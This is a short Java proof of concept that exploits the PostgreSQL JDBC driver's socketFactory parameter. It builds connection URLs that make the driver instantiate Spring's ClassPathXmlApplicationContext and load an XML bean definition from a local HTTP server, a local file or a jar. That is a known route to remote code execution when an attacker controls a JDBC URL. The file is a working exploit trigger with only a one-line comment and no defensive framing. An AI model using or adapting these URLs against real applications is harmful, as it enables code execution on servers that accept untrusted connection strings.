package com.test.exp;

import org.postgresql.Driver;

import java.sql.SQLException;

// 本质是调用构造方法
public class SocketFactory {
    public static void main(String[] args) throws SQLException {
        String url1 = "jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:7777/1.xml";
        String url2 = "jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=file:///D:/1.xml";
        String url3 = "jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///D:/1.jar!/1.xml";
        Driver driver = new Driver();
        driver.connect(url1, null);
    }
}
